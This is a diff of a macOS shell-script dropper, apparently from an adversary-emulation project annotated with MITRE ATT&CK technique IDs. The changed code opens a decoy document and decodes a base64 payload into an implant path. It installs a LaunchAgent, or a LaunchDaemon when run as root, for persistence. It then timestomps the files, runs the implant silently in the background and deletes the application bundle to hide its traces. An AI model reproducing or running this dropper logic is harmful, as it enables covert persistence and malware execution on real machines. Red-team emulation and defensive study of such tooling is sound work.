@@ -49,24 +49,33 @@ execution_path="$( dirname "$parent_parent_path" )"
 # copy decoy doc to tmp and open it
 cp "$parent_parent_path/$TEMPPATH_IOP" "/tmp/$doc_name" && open -n "/tmp/$doc_name"
 
-new_plist="$(sed -ne '/string/{s/.*<string>\(.*\)<\/string>.*/\1/p;q;}' $parent_path_copy/PkgInfo)"
-new_path="/$(sed -ne '/string/{s/.*<string>\/\(.*\)<\/string>.*/\1/p;}' $parent_path_copy/PkgInfo)"
+plist_label="$(sed -ne '/string/{s/.*<string>\(.*\)<\/string>.*/\1/p;q;}' $parent_path_copy/PkgInfo)"
+implant_path="/$(sed -ne '/string/{s/.*<string>\/\(.*\)<\/string>.*/\1/p;}' $parent_path_copy/PkgInfo)"
 home_path="$( dirname "$execution_path" )"
+
+# if UID is not 0, create a LaunchAgent, otherwise create a LaunchDaemon
+if [ "$EUID" -ne 0 ]; then
+    implant_path="$home_path$implant_path"
+    plist_path="$home_path/Library/LaunchAgents/$plist_label"
+else
+    plist_path="$home_path/Library/LaunchDaemons/$plist_label"
+fi
 
 # create LaunchAgent plist
 #   MITRE ATT&CK Techniques:
 #       T1543.001 Create or Modify System Process: Launch Agent
-cp $parent_path_copy/PkgInfo "$home_path/Library/LaunchAgents/$new_plist";
+#       T1543.004 Create or Modify System Process: Launch Daemon
+cp $parent_path_copy/PkgInfo $plist_path;
 
 # replace decoy doc in application bundle with decoded second stage
-echo $payload | base64 -d > $new_path
+echo $payload | base64 -d > $implant_path
 
 # update timestamp, make executable, then attempt to execute in background
 #   MITRE ATT&CK Techniques:
 #       T1070.006 Indicator Removal: Timestomp
 #       T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
-touch -t 1910071234 "$home_path/Library/LaunchAgents/$new_plist"
-touch -t 1910071234 $new_path && chmod 755 $new_path && $new_path >/dev/null 2>&1 &
+touch -t 1910071234 $plist_path
+touch -t 1910071234 $implant_path && chmod 755 $implant_path && $implant_path >/dev/null 2>&1 &
 
 # remove application bundle then move decoy doc from tmp to the current execution path
 sleep 2 ; rm -rf "$parent_parent_path" ; mv "/tmp/$doc_name" "$execution_path/$doc_name" ;
